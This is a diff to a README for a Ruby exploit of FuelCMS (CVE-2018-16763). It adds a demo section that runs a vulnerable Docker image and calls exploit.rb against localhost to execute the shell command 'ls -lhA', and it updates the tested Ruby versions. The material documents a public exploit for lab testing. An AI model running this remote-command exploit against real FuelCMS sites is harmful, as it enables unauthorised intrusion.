@@ -43,6 +43,14 @@ Example using gem:
 gem install httpclient docopt
 ```
 
+## Demo environment
+
+```
+$ docker pull her0ma/fuelcms
+$ docker run -d -p 8099:80 -p 3306:3306 her0ma/fuelcms /bin/startup.sh
+$ ruby exploit.rb http://127.0.0.1:8099/index.php/ 'ls -lhA'
+```
+
 ## Reference
 
 This is a better re-write of [EDB-ID-47138][EDB-ID-47138] ([Github](https://github.com/dinhbaouit/CVE-2018-16763)):
@@ -52,7 +60,7 @@ This is a better re-write of [EDB-ID-47138][EDB-ID-47138] ([Github](https://gith
 - cleaner & more customizable
 - using ruby (python2 is deprecated)
 
-This exploit was tested with Ruby 2.7.2.
+This exploit was tested with Ruby 2.7.2, 3.0.2.
 
 About [EDB-ID-47138][EDB-ID-47138]:
 
